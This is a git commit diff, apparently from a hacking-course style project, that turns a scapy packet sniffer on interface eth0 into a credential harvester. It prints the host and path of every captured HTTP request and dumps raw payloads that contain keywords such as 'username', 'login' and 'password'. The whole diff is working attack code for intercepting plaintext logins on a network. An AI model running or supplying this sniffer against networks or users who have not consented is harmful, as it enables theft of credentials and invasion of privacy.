9f6355bf3cc1cb3553541282f9857e541fb40cde
asymptote-technology <technologyasymptote@gmail.com>
2024-03-11 02:11:29 -0400

    Added sniffer

--- packet_sniffer/main.py
+++ packet_sniffer/main.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
+from scapy.layers import http
 
 
 def sniff(interface):
@@ -8,7 +9,19 @@ def sniff(interface):
 
 
 def process_sniffed_packet(packet):
-    print(packet)
+    if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print(url)
+        # Show() displays all the OSI layers in the packet
+        # print(packet.show())
+        # Scapy.Raw allows to get only the payload layer
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ["username", "uname", "login", "pass", "password"]
+            for keyword in keywords:
+                if keyword in str(load):
+                    print(load)
+                    break
 
 
 sniff("eth0")
